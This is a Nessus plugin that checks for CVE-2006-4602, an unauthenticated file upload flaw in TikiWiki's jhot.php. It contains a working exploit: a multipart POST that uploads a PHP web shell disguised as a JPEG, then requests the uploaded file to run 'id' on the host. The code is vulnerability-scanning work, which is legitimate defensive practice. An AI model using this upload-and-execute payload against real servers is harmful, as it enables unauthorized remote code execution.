#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that allows uploading of
arbitrary files. 

Description :

The 'jhot.php' script included with the version of TikiWiki installed
on the remote host allows an unauthenticated attacker to upload
arbitrary files to a known directory within the web server's document
root.  Provided PHP's 'file_uploads' setting is enabled, which is true
by default, this flaw can be exploited to execute arbitrary code on
the affected host, subject to the privileges of the web server user
id. 

See also :

http://milw0rm.com/exploits/2288
http://tikiwiki.org/tiki-index.php?page=ReleaseProcess195&bl

Solution :

Either remove the affected 'jhot.php' script or upgrade to TikiWiki
1.9.5 or later.

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(22303);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-4602");
  script_bugtraq_id(19819);
  script_xref(name:"OSVDB", value:"28456");

  script_name(english:"TikiWiki jhot.php Arbitrary File Uploads Vulnerability");
  script_summary(english:"Tries to run a command through TikiWiki");

  script_description(english:desc);

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl", "no404.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/no404/" + port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/tiki", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure the affected script exists.
  url = string(dir, "/jhot.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # If it does...
  #
  # nb: the script doesn't respond when called directly.
  if (egrep(string:res, pattern:"^HTTP/.* 200 OK"))
  {
    # Try to exploit the flaw to execute a command.
    cmd = "id";
    fname = string(SCRIPT_NAME, "-", unixtime(), ".php");
    boundary = "bound";
    req = string(	
      "POST ",  url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="filepath"; filename="', fname, '";', "\r\n",
      "Content-Type: image/jpeg;\r\n",
      "\r\n",
      '<?\r\n',
      '# nb: only run cmd if the request is from the nessusd host.\r\n',
      'if ($REMOTE_ADDR == "', this_host(), '") { system(', cmd, '); }\r\n',
      '?>\r\n',
      '\r\n',

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (res == NULL) exit(0);

    # Now call the file we just uploaded.
    req = http_get(item:string(dir, "/img/wiki/", fname), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line)
    {
      if (report_verbosity < 1) report = desc;
      else report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus was able to execute the command 'id' on the remote host,\n",
        "which produced the following output :\n",
        "\n",
        line
      );
      security_hole(port:port, data:report);
      exit(0);
    }
  }
}
